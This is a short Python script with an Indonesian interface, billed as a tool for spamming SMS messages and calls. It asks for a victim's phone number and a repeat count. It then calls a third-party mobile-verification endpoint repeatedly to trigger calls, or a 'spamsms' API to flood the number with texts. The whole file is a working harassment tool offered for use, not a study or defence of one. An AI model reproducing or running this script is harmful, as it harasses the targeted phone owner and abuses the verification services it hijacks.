import requests, json, time

baner = """
  /$$$$$$                                                 
 /$$__  $$                                                
| $$  \__/  /$$$$$$   /$$$$$$  /$$$$$$/$$$$  /$$$$$$/$$$$ 
|  $$$$$$  /$$__  $$ |____  $$| $$_  $$_  $$| $$_  $$_  $$
 \____  $$| $$  \ $$  /$$$$$$$| $$ \ $$ \ $$| $$ \ $$ \ $$
 /$$  \ $$| $$  | $$ /$$__  $$| $$ | $$ | $$| $$ | $$ | $$
|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$ | $$ | $$| $$ | $$ | $$
 \______/ | $$____/  \_______/|__/ |__/ |__/|__/ |__/ |__/
          | $$                                            
          | $$                                            
          |__/                                            """;print(baner)
banner = "\n\tTools Spam Sms dan Call\n\t1. Call\n\t2. Sms\n";print(banner)
try:
    pilih = input("\tpilih: ")
    no = input("exc: 898xxxxxxx\nMasukan nomor: ")
    brp = int(input("Brp kali: "))
    if pilih == "1":
        for i in range(brp):
            req = requests.get("https://id.jagreward.com/member/verify-mobile/"+no).json()
            if req["result"] == 1:
                print("berhasil")
                time.sleep(10)
            elif req["result"] == -1:
                print("masukan nomor yg benar")
                break
            elif req["result"] == 0:
                print(req["message"])
                break
            else:
                print("Salah")
                break
    elif pilih == "2":
        for i in range(brp):
            req = requests.get("https://amfcode.my.id/api/spamsms?phone="+no).json()
            if req["result"]["status"] == True:
                print(i+1, req["result"]["message"])
            else:
                print(i+1, req["result"]["message"])
                break
except ValueError:
    print("\nIsi yang benar")
